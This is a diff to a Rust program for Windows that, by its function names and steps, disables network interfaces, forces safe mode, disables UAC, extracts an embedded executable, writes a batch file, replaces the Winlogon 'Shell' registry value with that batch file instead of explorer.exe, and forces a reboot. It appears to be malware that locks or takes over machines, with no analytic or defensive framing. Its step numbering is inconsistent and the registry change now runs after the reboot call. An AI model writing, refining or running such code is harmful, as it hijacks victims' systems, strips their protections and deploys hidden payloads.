@@ -115,10 +115,10 @@ fn modify_registry() -> io::Result<()> {
     }
 
     // Set new "Shell" value
-    let new_shell_value = r"explorer.exe, c:\program files\utkudrk2\utkudrk2.bat";
+    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.bat";
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
-    println!("Registry modified successfully: Shell set to \"explorer.exe, C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");
+    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");
 
     Ok(())
 }
@@ -199,7 +199,7 @@ fn reboot_system() -> io::Result<()> {
     Command::new("shutdown.exe")
         .arg("-r")
         .arg("-t")
-        .arg("10")
+        .arg("7")
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()?;
@@ -225,27 +225,22 @@ fn main() {
         eprintln!("Error disabling network interfaces: {}", e);
     }
 
-    // Step 3: Modify the registry to set Shell value
-    if let Err(e) = modify_registry() {
-        eprintln!("Error modifying the registry: {}", e);
-    }
-
-    // Step 4: Enable safe mode
+    // Step 3: Enable safe mode
     if let Err(e) = enable_safe_mode() {
         eprintln!("Error enabling safe mode: {}", e);
     }
 
-    // Step 5: Disable UAC
+    // Step 4: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
 
-    // Step 6: Extract payload
+    // Step 5: Extract payload
     if let Err(e) = extract_embedded_exe() {
         eprintln!("Error extracting embedded executable: {}", e);
     }
     
-    // Step 7: Create the batch file in the current directory
+    // Step 6: Create the batch file in the current directory
     if let Err(e) = create_batch_file() {
         eprintln!("Error creating batch file: {}", e);
         return;
@@ -255,4 +250,10 @@ fn main() {
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
+
+    // Step 9: Modify the registry to set Shell value
+    if let Err(e) = modify_registry() {
+        eprintln!("Error modifying the registry: {}", e);
+    }
+
 }
